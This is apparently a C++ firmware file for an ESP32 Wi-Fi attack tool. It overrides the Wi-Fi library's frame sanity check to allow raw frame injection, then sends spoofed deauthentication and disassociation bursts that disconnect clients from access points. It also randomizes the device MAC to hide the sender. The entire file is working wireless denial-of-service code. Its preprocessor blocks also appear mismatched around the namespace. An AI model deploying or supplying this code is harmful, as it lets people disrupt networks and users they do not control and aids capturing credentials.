// WSL Bypasser — Frame injection enabler for ESP32
// Override of ieee80211_raw_frame_sanity_check requires -Wl,-zmuldefs in build_flags
#include "wsl_bypasser.h"
#if !defined(NEONDRIVE_TARGET_M5TAB5)

// ===================================================================
// CRITICAL: This overrides the WiFi library's internal sanity check.
// Without this, the ESP32 rejects all management frames (deauth,
// disassoc, auth) before they reach the radio hardware.
// The -Wl,-zmuldefs linker flag allows this duplicate definition to
// take precedence over the one in libnet80211.a.
// ===================================================================
extern "C" {
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    // Marauder-style magic number pattern:
    // Normal calls: return 0 → frame passes → injection allowed
    // Self-test call with 31337: return 1 → detects override is active
    if (arg == 31337)
        return 1;   // Self-test: "yes, bypass is installed"
    return 0;       // Allow ALL frame types through
}
}

namespace WSLBypasser {

esp_err_t sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    uint8_t pkt[26] __attribute__((aligned(4))) = {
        0xC0, 0x00,                             // Frame Control: Deauth
        0x00, 0x00,                             // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // DA (will fill)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SA (will fill)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID (will fill)
        0x00, 0x00,                             // Sequence
        0x07, 0x00                              // Reason
    };
    memcpy(pkt + 4, station, 6);   // Destination
    memcpy(pkt + 10, bssid, 6);    // Source (spoof as AP)
    memcpy(pkt + 16, bssid, 6);    // BSSID
    pkt[24] = reason;

    return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
}

esp_err_t sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    uint8_t pkt[26] __attribute__((aligned(4))) = {
        0xA0, 0x00,                             // Frame Control: Disassoc
        0x00, 0x00,                             // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // BSSID
        0x00, 0x00,                             // Sequence
        0x08, 0x00                              // Reason
    };
    memcpy(pkt + 4, station, 6);
    memcpy(pkt + 10, bssid, 6);
    memcpy(pkt + 16, bssid, 6);
    pkt[24] = reason;

    return esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
}

void sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    bool isBroadcast = (memcmp(station, broadcast, 6) == 0);

    for (uint8_t i = 0; i < count; i++) {
        // Forward: AP → Client
        sendDeauthFrame(bssid, station, 7);  // Class 3 from non-associated
        delay(random(1, 6));

        // Reverse: Client → AP (spoofed, skip for broadcast)
        if (!isBroadcast) {
            uint8_t rev[26] __attribute__((aligned(4))) = {
                0xC0, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00,
                0x01, 0x00  // Reason: Unspecified
            };
            memcpy(rev + 4, bssid, 6);       // To AP
            memcpy(rev + 10, station, 6);     // From Client (spoofed)
            memcpy(rev + 16, bssid, 6);       // BSSID
            esp_wifi_80211_tx(WIFI_IF_STA, rev, sizeof(rev), false);
            if (i < count - 1) delay(random(1, 6));
        }

        // Also send disassoc (some clients only respond to this)
        if (i == 0) {
            sendDisassocFrame(bssid, station, 8);
        }
    }
}

#endif // !NEONDRIVE_TARGET_M5TAB5

void randomizeMAC() {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] &= 0xFE;  // Clear multicast bit
    mac[0] |= 0x02;  // Set local-admin bit
    esp_wifi_set_mac(WIFI_IF_STA, mac);
    Serial.printf("[WSL] MAC randomized: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

}  // namespace WSLBypasser
